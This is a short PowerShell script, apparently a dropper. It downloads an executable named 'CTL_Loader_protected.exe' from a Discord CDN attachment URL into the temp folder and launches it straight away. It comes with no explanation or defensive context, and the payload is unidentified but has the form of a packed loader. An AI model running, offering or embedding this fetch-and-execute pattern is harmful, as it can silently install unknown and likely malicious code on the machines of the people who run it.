$url = "https://cdn.discordapp.com/attachments/1218683568276897872/1219477303588032554/CTL_Loader_protected.exe?ex=660b71bd&is=65f8fcbd&hm=1c48e7a0fae2ef09142b3c331f83216770b72727e17ccfa39d24d829460c3030&"
$outputFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "CTL_Loader_protected.exe")

Invoke-WebRequest -Uri $url -OutFile $outputFilePath

Write-Host "File downloaded to: $outputFilePath"

Start-Process $outputFilePath
